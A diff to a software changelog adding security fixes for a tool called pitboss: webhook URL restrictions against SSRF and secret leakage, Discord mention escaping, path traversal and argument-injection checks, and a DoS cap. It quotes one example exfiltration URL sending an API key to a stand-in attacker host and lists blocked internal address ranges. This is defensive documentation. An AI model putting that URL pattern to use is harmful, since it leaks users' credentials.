@@ -7,7 +7,49 @@ This project uses [Semantic Versioning](https://semver.org/).
 
 ## [Unreleased]
 
-*(nothing yet)*
+### Breaking changes
+
+- **Notification webhook URLs: `${VAR}` substitution now requires the
+  `PITBOSS_` prefix.** Closes an exfiltration vector where a rogue
+  manifest could write `url = "https://attacker/?t=${ANTHROPIC_API_KEY}"`
+  and leak any host env var to the chosen webhook. If you currently
+  reference an unprefixed variable (e.g. `${SLACK_WEBHOOK_URL}`), rename
+  it in the environment that launches pitboss (e.g. to
+  `PITBOSS_SLACK_WEBHOOK_URL`) and update the manifest accordingly.
+  Unprefixed names now fail loudly at load time rather than silently
+  reaching through to `std::env::var`.
+- **Notification webhook URLs: HTTPS-only, public hosts only.**
+  `http://`, `file://`, and other non-`https` schemes are rejected, as
+  are loopback (`localhost`, `127.0.0.0/8`, `::1`, `::ffff:127.*`),
+  RFC1918 private ranges, link-local (`169.254.0.0/16` — covers the
+  AWS/GCP metadata service), CGNAT (`100.64.0.0/10`), IPv6 ULA
+  (`fc00::/7`), and IPv6 link-local (`fe80::/10`). If you were pointing
+  a webhook at an internal service on purpose, that's no longer
+  supported — route the notification through a public relay instead.
+
+### Security
+
+- **SSRF / secret-exfiltration hardening on `[[notification]]` sinks.**
+  See "Breaking changes" above for URL scheme / host and env-var
+  substitution restrictions.
+- **Discord sink: markdown and mention injection.** Untrusted fields
+  (`request_id`, `task_id`, `summary`, `run_id`, `source`) are now
+  backslash-escaped before being embedded in the Discord description,
+  and every payload sets `allowed_mentions.parse = []` so an attacker
+  who sneaks `@everyone` or a Discord link through a task summary can't
+  actually ping the channel or spoof a clickable link.
+- **`pitboss attach`: path traversal.** `task_id` is now rejected if it
+  is empty, `.`, `..`, or contains `/`, `\\`, or NUL. After the
+  directory check, the task dir is canonicalized and required to remain
+  inside `<run>/tasks/`, closing a pre-planted-symlink escape.
+- **`pitboss resume`: session-id argument injection.** The
+  `claude_session_id` read from on-disk `summary.json` is now validated
+  (`[A-Za-z0-9_-]{1,128}`, no leading `-`) before it is passed to
+  `claude --resume <ID>`. A tamperer with write access to the run
+  directory can no longer inject CLI flags via that field.
+- **MCP bridge: unbounded `read_until` DoS.** The client-to-server loop
+  now reads chunked with a 4 MiB per-line cap; a child that never emits
+  `\n` closes the bridge instead of OOM-ing the host.
 
 ## [0.7.0] — 2026-04-20
 
